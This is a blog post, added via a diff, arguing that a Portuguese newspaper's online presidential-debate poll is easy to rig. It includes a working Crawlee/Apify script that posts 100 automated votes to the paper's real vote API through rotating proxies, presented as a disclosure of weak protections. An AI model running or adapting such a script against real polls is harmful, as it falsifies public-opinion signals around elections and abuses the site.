@@ -1,0 +1,86 @@
+---
+image: https://github.com/user-attachments/assets/b21caa69-7263-48aa-9099-05b4f56dc965
+published_at: 2025-12-03
+tags: [Hack, Polls, Elections, Manipulation, Bot]
+---
+
+# Why online debate polls like this one are unreliable (Jornal de Notícias)
+
+Jornal de Notícias published an online poll asking readers to decide who won a 1:1 debate for the Portuguese presidential elections.
+
+image::https://github.com/user-attachments/assets/b21caa69-7263-48aa-9099-05b4f56dc965[Jornal de Notícias debate poll,height=500]
+
+At first glance, it looks like a simple public opinion snapshot. In practice, it is **trivially easy to manipulate**.
+
+With minimal technical effort, it is possible to generate **large volumes of fake votes** for any candidate. This means the final percentages shown to the public can be heavily distorted and **do not reflect real voter sentiment**.
+
+## The problem with these polls
+
+The poll relies entirely on weak protections:
+
+* No strong user identification
+* No effective rate limiting
+* No meaningful bot protection
+
+As a result, automated scripts can submit votes in bulk in a very short time. There is no reliable way for the platform to distinguish real users from automated submissions.
+
+## How simple this is in practice
+
+Below is a minimal example showing how easy it is to automate votes using https://www.apify.com?fpr=t4bn9[Apify]'s Crawlee library. Crawlee abstracts most of the usual friction involved in this kind of automation and automatically bypasses common basic protections by using a combination of techniques, including:
+
+- Rotating proxies
+- Automatically generated and rotated user agents
+- Request fingerprinting that mimics real browsers
+
+```typescript
+import { Actor } from 'apify';
+import { HttpCrawler } from 'crawlee';
+
+await Actor.init();
+
+const proxyConfiguration = await Actor.createProxyConfiguration();
+
+const crawler = new HttpCrawler({
+    additionalMimeTypes: ['text/plain'],
+    proxyConfiguration,
+    maxConcurrency: 1,
+    maxRequestsPerMinute: 30,
+    requestHandler: async ({ request, log, sendRequest }) => {
+        const response = await sendRequest();
+        log.info(
+            JSON.stringify({
+                body: request.payload.toString(),
+                statusCode: response.statusCode.toString(),
+                response: response.body.toString(),
+            }),
+        );
+    },
+});
+
+await crawler.run(
+    Array(100)
+        .fill({
+            url: 'https://apix.noticiasilimitadas.pt/api/jn/poll/vote',
+            method: 'POST',
+            payload: JSON.stringify({ poll_id: 4, answer_id: 1 }),
+        })
+        .map((e, index) => ({ ...e, skipNavigation: true, uniqueKey: `${index}-${e.url}` })),
+);
+
+await Actor.exit();
+```
+
+This sends 100 valid votes in seconds without triggering any meaningful protection.
+
+From the poll's perspective, these requests look like they are coming from different real users.
+
+### Why I'm sharing this
+
+The goal of sharing this code is **not to incentivize manipulation**, but to clearly demonstrate how fragile these polls are. I understand this may enable abuse, but the reality is that this kind of manipulation **is already possible and likely already happening**. Hiding the weakness only protects the illusion, not the system.
+
+## Final note
+
+These polls are fine as entertainment. They should **never be interpreted as serious indicators of public opinion** unless strong protections against automation and abuse are in place.
+
+If you see one of these polls circulating with thousands of votes, assume one thing:
+**it can be rigged, and very likely is.**
